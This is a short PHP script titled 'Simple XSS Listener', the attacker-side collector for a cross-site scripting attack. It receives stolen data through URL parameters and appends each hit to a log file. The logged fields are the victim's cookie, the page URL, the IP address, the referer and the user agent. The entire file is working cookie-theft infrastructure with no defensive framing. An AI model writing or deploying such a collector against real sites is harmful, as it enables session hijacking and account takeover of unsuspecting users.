<?php
// Simple XSS Listener
$log = "=== XSS HIT ===\n";
$log .= "Time: " . date('Y-m-d H:i:s') . "\n";
$log .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$log .= "Cookie: " . $_GET['c'] . "\n";
$log .= "URL: " . $_GET['u'] . "\n";
$log .= "Referer: " . $_SERVER['HTTP_REFERER'] . "\n";
$log .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$log .= "========================\n\n";

file_put_contents("hits.log", $log, FILE_APPEND);

// Also show something on screen
echo "OK";
?>
